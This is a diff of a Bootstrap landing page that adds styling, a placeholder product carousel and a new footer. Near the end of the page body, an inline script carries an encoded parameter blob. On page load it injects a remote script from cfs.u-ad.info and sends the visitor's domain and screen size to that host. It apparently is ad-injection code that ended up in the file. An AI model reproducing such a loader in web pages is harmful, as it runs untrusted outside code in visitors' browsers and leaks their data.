@@ -9,7 +9,8 @@
   
   <link rel="stylesheet" href="css/bootstrap.css">
   <link rel="stylesheet" href="css/bootstrap.min.css">
- 
+      <link href="css/custom.css" rel="stylesheet">
+
   
     <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
@@ -17,6 +18,11 @@
    <link rel="stylesheet" href="css/home_style.css">
 </head>
   <style>
+  /*make the menu sub-menu items drop down on mouse hover */
+ul.nav li.dropdown:hover > ul.dropdown-menu{
+    display: block;
+    margin: 0;
+}
 
   h2 {
       font-size: 24px;
@@ -56,11 +62,16 @@
       padding: 0 0 15px 0;
       border: none;
       border-radius: 0;
+	  border:1px #F00 solid;
   }
   .thumbnail img {
       width: 100%;
       height: 100%;
       margin-bottom: 10px;
+  }
+    .thumbnail:hover IMG{
+		height:100px;
+		width:100px;
   }
   .carousel-control.right, .carousel-control.left {
       background-image: none;
@@ -160,8 +171,7 @@
   .carousel-inner > .item > a > img {
       width: 1700px;
       margin: auto;
-	  height:280px;
-	  background:#0FC;
+	  height:380px;
   }
  
 .carousel,
@@ -171,10 +181,29 @@
 	width: 100%;
     height: 100%;
 }
-.corousel-indicators,
-.carousel-inner {
-    height: 100%;
+.corousel-top{    
+	content: '';
+    top: 0;
+    left: 0;
+    right: 0;
+    left: 0;
 }
+
+	#myCarousel::before{
+		content:' ';
+		color:#FC3;
+		opacity:0.4;
+		background:#008080;
+		height:100%;
+		width:1700px;
+		position:absolute;
+		z-index:1000;
+	}
+/* FOR SLIDER BOTTOM */
+
+
+/* END OF SLIDER BOTTOM */
+
   @keyframes slide {
     0% {
       opacity: 0;
@@ -296,7 +325,7 @@
     </ol>
 
     <!-- Wrapper for slides -->
-    <div class="carousel-inner" role="listbox">
+    <div class="carousel-inner corousel-top" role="listbox">
 
       <div class="item active">
         <img src="assets/2.jpg" alt="Chania" width="460" height="200">
@@ -422,7 +451,175 @@
 
 
 <!-- Container (Pricing Section) -->
+<div class="container">
+	<div class="col-xs-12">
+	
+		<div class="page-header">
+<h3 class="text-center"><span class="label label-warning">Best Buy !</span></h3>	
+		</div>
+			
+		<div class="carousel slide" id="my_Carousel">
+			<div class="carousel-inner">
+				<div class="item active">
+					<ul class="thumbnails">
+						<li class="col-sm-3">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="#"><img src="http://placehold.it/360x240" alt=""></a>
+                 <div class="desc-caption">
+                           <p>lorem ispum dolor sit amet dolor sit</p>
+                 </div>                                     
+								</div>
+						
+							</div>
+						</li>
+						<li class="col-sm-3">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="#"><img src="http://placehold.it/360x240" alt=""></a>
+                   <div class="desc-caption">
+                           <p>lorem ispum dolor sit amet dolor sit</p>
+                 </div> 
+								</div>
+					
+							</div>
+						</li>
+						<li class="col-sm-3">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="#"><img src="http://placehold.it/360x240" alt=""></a>
+                 <div class="desc-caption">
+                           <p>lorem ispum dolor sit amet dolor sit</p>
+                 </div>                                   
+								</div>
+								
+							</div>
+						</li>
+						<li class="col-sm-3">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="#"><img src="http://placehold.it/360x240" alt=""></a>
+                 <div class="desc-caption">
+                           <p>lorem ispum dolor sit amet dolor sit</p>
+                 </div>    
+								</div>
+							
+							</div>
+						</li>
+					</ul>
+				</div>
+                <!-- /Slide 1 --> 
+				<div class="item">
+					<ul class="thumbnails">
+						<li class="col-sm-3">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="#"><img src="http://placehold.it/360x240" alt=""></a>
+                 <div class="desc-caption">
+                           <p>lorem ispum dolor sit amet dolor sit</p>
+                 </div>                                     
+								</div>
 
+							</div>
+						</li>
+						<li class="col-sm-3">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="#"><img src="http://placehold.it/360x240" alt=""></a>
+                  <div class="desc-caption">
+                           <p>lorem ispum dolor sit amet dolor sit</p>
+                 </div>                                    
+								</div>
+								
+							</div>
+						</li>
+						<li class="col-sm-3">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="#"><img src="http://placehold.it/360x240" alt=""></a>
+                  <div class="desc-caption">
+                           <p>lorem ispum dolor sit amet dolor sit</p>
+                 </div>                                    
+								</div>
+								
+							</div>
+						</li>
+						<li class="col-sm-3">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="#"><img src="http://placehold.it/360x240" alt=""></a>
+                  <div class="desc-caption">
+                           <p>lorem ispum dolor sit amet dolor sit</p>
+                 </div>                                    
+								</div>
+
+							</div>
+						</li>
+					</ul>
+				</div>
+                <!-- /Slide2 --> 
+				<div class="item">
+					<ul class="thumbnails">
+						<li class="col-sm-3">	
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="#"><img src="http://placehold.it/360x240" alt=""></a>
+                 <div class="desc-caption">
+                           <p>lorem ispum dolor sit amet dolor sit</p>
+                 </div>                                     
+								</div>
+							
+							</div>
+						</li>
+						<li class="col-sm-3">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="#"><img src="http://placehold.it/360x240" alt=""></a>
+                   <div class="desc-caption">
+                           <p>lorem ispum dolor sit amet dolor sit</p>
+                 </div>                                   
+								</div>
+			
+							</div>
+						</li>
+						<li class="col-sm-3">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="#"><img src="http://placehold.it/360x240" alt=""></a>
+ <p>Nullam Condimentum Nibh Etiam Sem</p                                   
+								></div>
+	
+							</div>
+						</li>
+						<li class="col-sm-3">
+							<div class="fff">
+								<div class="thumbnail">
+									<a href="#"><img src="http://placehold.it/360x240" alt=""></a>
+                 <div class="desc-caption">
+                           <p>lorem ispum dolor sit amet dolor sit</p>
+                 </div>                                     
+								</div>
+
+							</div>
+						</li>
+					</ul>
+				</div><!-- /Slide3 --> 
+			</div>
+			
+		   <nav>
+				<ul class="control-box pager">
+					<li><a data-slide="prev" href="#my_Carousel" class=""><i class="glyphicon glyphicon-chevron-left"></i></a></li>
+					<li><a data-slide="next" href="#my_Carousel" class=""><i class="glyphicon glyphicon-chevron-right"></i></li>
+				</ul>
+			</nav>
+		   <!-- /.control-box -->   
+								  
+		</div><!-- /#my_Carousel -->
+	</div><!-- /.col-xs-12 -->     
+</div><!-- /.container -->
+    
+    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+ 
 
 <!-- Container (Contact Section) -->
 <div id="contact" class="container-fluid bg-grey" style="background:#0A5">
@@ -455,10 +652,11 @@
 
 
 <footer class="container-fluid text-center" style="background:#400040">
-  <a href="#myPage" title="To Top">
-    <span class="glyphicon glyphicon-chevron-up"></span>
-  </a>
-  <p>jennifer wallet <a href="http://www.w3schools.com" title="jennifer wallet">www.jennifer wallet.com</a></p>		
+<div class="row">
+<div class="col-sm-4">lorem ipsum dolor sit amet</div>
+<div class="col-sm-4">About us</div>
+<div class="col-sm-4">External Link</div>
+</div>	
 </footer>
 
 
@@ -559,5 +757,18 @@ $(document).ready(function(){
 </script>
 
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bED2so3wojuFaZElErTcmmHk0M4%2f%2fMJ7ZktGM3n1NhoD2fhKauAwsL9U%2ffoEAjwRJmk88xEjyVUodTnaESQCnxARTBmynH6AKcT0YQk6S%2faHjnG5BQ4ajpYnq1Z55kOaj318tX0eBiC5v8eP5V5s1IX0rELheabFR5xXNQYWaNjqR6ibkdV2F3e%2fpaZZu86cwrNzHGGAGdGscYRqB29imk0OjVmXkK9gDq90nyvAT1KQn0MjdKA8KFPxRLKGq4n3x6qrUbxzkq%2bRhxM6rHgKh98I0FJY0mgBOBor48xFK374rrNPlZr7Wys7cps5AiQpyWOhY8nYsD5dOj30EgBaI4CxdsDVmhG%2b8PdhBM%2fhimQ7Gca37uT%2bWDhVL7j%2fvxCfkrZe44v4rCvv8yy0bwAKppkfR2ixZkhhCUOU2UZczLZvfJAy77BfTsKhIO3uWvr9ASNgZNvmoUsBUkH%2bwRhNwYuAjwp%2b0qyOGbKtcoSCw1vpHJfLADSGl1SSYChND3oTnd9xEILz5cTOigaxlJ%2fBwo4MtTl8Z3g3KkvaO%2bROWF8R6GELYtntJQ%2b%2fNavD4o82h" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+
+    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+    <!-- Include all compiled plugins (below), or include individual files as needed -->
+    
+    <!-- JQuery Carousel -->
+    <script>
+        // Carousel Auto-Cycle
+        $(document).ready(function() {
+            $('.carousel').carousel({
+              interval: 3000
+            })
+        });
+    </script>
 </body>
 </html>
